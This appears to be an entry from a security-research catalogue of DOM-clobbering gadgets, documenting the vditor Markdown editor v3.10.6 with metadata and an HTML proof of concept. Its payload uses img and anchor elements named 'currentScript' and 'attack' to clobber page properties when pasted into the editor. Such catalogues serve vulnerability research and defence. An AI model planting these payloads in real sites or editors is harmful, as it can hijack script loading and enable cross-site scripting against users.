## vditor

### Meta

+ Library: vditor
+ Version: v3.10.6
+ Stars: 8.3K
+ Fingerprint: `typeof window.Vditor !== undefined`
+ Input: Type
+ Sanitizer: N/A
+ Capability: Any named property
+ CVE: N/A
+ Status: N/A

### Library

https://github.com/Vanessa219/vditor

### Vulnerable Code Snippet

N/A

### PoC 

```html
<!--Library-->
  <link rel="stylesheet" href="https://unpkg.com/vditor/dist/index.css">
  <div id="vditor" class="vditor"></div>
  <script src="https://unpkg.com/vditor/dist/index.min.js"></script>
  <script>
    let vditorInstance;
    function initVditor() {
      vditorInstance = new Vditor('vditor', {
        after: () => {
          vditorInstance.setValue("HELLO WORLD");
        }
      });
    }
    window.onload = initVditor;
  </script>
<!--Library-->


<!--Payload-->
<img name="currentScript" src="https://xxx.xxx.xxx">
<img name="attack" src="https://xxx.xxx.xxx">
<a name="attack" href="https://xxx.xxx.xxx">AAA</a>
<p>Copy & Paste the following rendered HTML elements to the editor;</p>
<!--Payload-->
```